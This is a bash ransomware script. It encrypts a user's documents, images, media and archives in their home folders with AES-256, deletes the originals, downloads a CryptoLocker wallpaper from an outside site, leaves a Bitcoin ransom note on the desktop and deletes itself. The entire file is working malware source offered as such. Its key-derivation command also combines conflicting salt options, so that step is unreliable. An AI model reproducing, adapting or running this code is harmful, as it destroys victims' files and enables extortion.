#!/bin/bash

# --- Configuration ---
PASSWORD="Purr\$3cureK1tty!"  # CHANGE THIS
SALT="catmeow!"  # Hex equivalent of [byte[]]@(0x63, 0x61, 0x74, 0x6D, 0x65, 0x6F, 0x77, 0x21)
ITERATIONS=100000
WALLPAPER_URL="https://blog-en.webroot.com/wp-content/uploads/2013/12/cryptolocker-desktop.bmp"
RANSOM_NOTE="=== YOUR FILES HAVE BEEN ENCRYPTED ===

To decrypt your files, send 0.1 BTC to:
1KittyCoinAddressHereMEOW

Contact: meow@protonmail.com"

# File types to target (current user only)
FILE_TYPES=(
    '.doc' '.docx' '.pdf' '.txt' '.xls' '.xlsx' '.ppt' '.pptx'
    '.jpg' '.jpeg' '.png' '.gif' '.bmp'
    '.mp4' '.avi' '.mov' '.mkv'
    '.mp3' '.wav' '.flac'
    '.zip' '.rar' '.7z'
)

# --- Encryption Functions ---
generate_key_iv() {
    # Generate key and IV using PBKDF2 with SHA-256
    local key_iv=$(echo -n "$PASSWORD" | openssl enc -pbkdf2 -md sha256 -salt -S "$(echo -n "$SALT" | xxd -p)" -iter "$ITERATIONS" -pass stdin -nosalt -k "" -P)
    
    KEY=$(echo "$key_iv" | grep 'key=' | cut -d= -f2)
    IV=$(echo "$key_iv" | grep 'iv =' | cut -d= -f2)
    
    # Ensure KEY and IV are proper length (32 and 16 bytes respectively)
    KEY=${KEY:0:64}  # 32 bytes in hex
    IV=${IV:0:32}    # 16 bytes in hex
}

encrypt_file() {
    local file="$1"
    local key="$2"
    local iv="$3"
    
    openssl enc -aes-256-cbc -salt -in "$file" -out "${file}.meow" -K "$key" -iv "$iv" 2>/dev/null
    if [ $? -eq 0 ]; then
        rm -f "$file"
    fi
}

process_files() {
    local key="$1"
    local iv="$2"
    
    local user_dirs=(
        "$HOME/Documents"
        "$HOME/Desktop"
        "$HOME/Pictures"
        "$HOME/Music"
        "$HOME/Videos"
        "$HOME/Downloads"
    )
    
    for dir in "${user_dirs[@]}"; do
        if [ -d "$dir" ]; then
            find "$dir" -type f | while read -r file; do
                ext="${file##*.}"
                ext=".$ext"  # Ensure extension has leading dot
                
                # Check if extension is in our target list and not already encrypted
                if [[ " ${FILE_TYPES[@]} " =~ " ${ext,,} " ]] && [[ "$file" != *.meow ]]; then
                    encrypt_file "$file" "$key" "$iv"
                fi
            done
        fi
    done
}

# --- Wallpaper Change ---
set_wallpaper() {
    local wallpaper_path="/tmp/wallpaper.bmp"
    
    if command -v wget &> /dev/null; then
        wget -q "$WALLPAPER_URL" -O "$wallpaper_path"
    elif command -v curl &> /dev/null; then
        curl -s "$WALLPAPER_URL" -o "$wallpaper_path"
    else
        return
    fi
    
    # Try different methods to set wallpaper based on desktop environment
    if command -v gsettings &> /dev/null; then
        # GNOME
        gsettings set org.gnome.desktop.background picture-uri "file://$wallpaper_path"
    elif command -v xfconf-query &> /dev/null; then
        # XFCE
        xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/image-path -s "$wallpaper_path"
    elif command -v feh &> /dev/null; then
        # Minimal setups with feh
        feh --bg-fill "$wallpaper_path"
    fi
}

# --- Ransom Note ---
create_ransom_note() {
    echo "$RANSOM_NOTE" > "$HOME/Desktop/READ_ME.txt"
}

# --- Main Execution ---
generate_key_iv
process_files "$KEY" "$IV"
set_wallpaper
create_ransom_note

# Self-delete (optional)
script_path="$(realpath "$0")"
{
sleep 2
rm -f "$script_path"
} &
